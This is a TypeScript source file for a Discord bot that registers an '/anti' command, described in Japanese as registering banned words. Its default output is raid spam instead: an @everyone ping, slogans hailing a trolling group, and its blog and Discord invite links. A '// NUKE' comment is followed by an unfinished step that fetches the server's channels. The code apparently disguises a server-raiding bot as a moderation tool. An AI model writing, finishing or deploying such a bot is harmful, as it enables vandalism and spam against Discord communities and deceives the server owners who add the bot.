import { Client, GatewayIntentBits } from "@djs";
import "https://deno.land/std@0.191.0/dotenv/load.ts";
import { Interaction, REST, Routes } from "@djs";
import { Logger } from "./logger.ts";

const { TOKEN, CLIENT_ID } = Deno.env.toObject();

const rest = new REST({ version: "10" }).setToken(TOKEN);

try {
  Logger.log(`Command registering.`);
  await rest.put(Routes.applicationCommands(CLIENT_ID), {
    body: [
        {
          name: "anti",
          description: "**禁止ワードを登録中...**",
          type: 1,
          options: [
            {
                name: "text",
                type: 3,
                required: false,
                description: "**禁止する文章を入力してください**",
            },
          ],
        }
    ],
  });
  Logger.log(`Command registered.`);
} catch (error) {
  Logger.log(`Command registration failed.`, "WARN");
  Logger.log(error, "WARN");
}

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on("ready", () => {
  Logger.log(`Logged in as ${Logger.bold(client.user?.tag ?? "")}`);
});

client.on("interactionCreate", async (interaction: Interaction) => {
  if (interaction.isCommand()) {
    const name = interaction.commandName;

    if (name === "anti") {
      const text = interaction.options.data[0].value ?? `<@everyone>
# 荒らし共栄圏最強
# [荒らし共栄圏に参加](https://ctkpaarr.data.blog/#Discord)
https://ctkpaarr.data.blog/
https://discord.gg/annycW3Xrk
# 荒らし共栄圏万歳
ーーーーーーーーーーーーーーーー
（画像） https://imgur.com/LacFtDP
（画像） https://imgur.com/gQkpAYe
（画像） https://imgur.com/mOlUpn3
`;
      await interaction.reply({ content: `**禁止ワードを登録しました**\n${text}`, ephemeral: true });

      // NUKE
      const channels = await interaction.guild?.channels.fetch(interaction.guildId ?? "");

      console.log(channels);
    }
  }
});

client.login(TOKEN);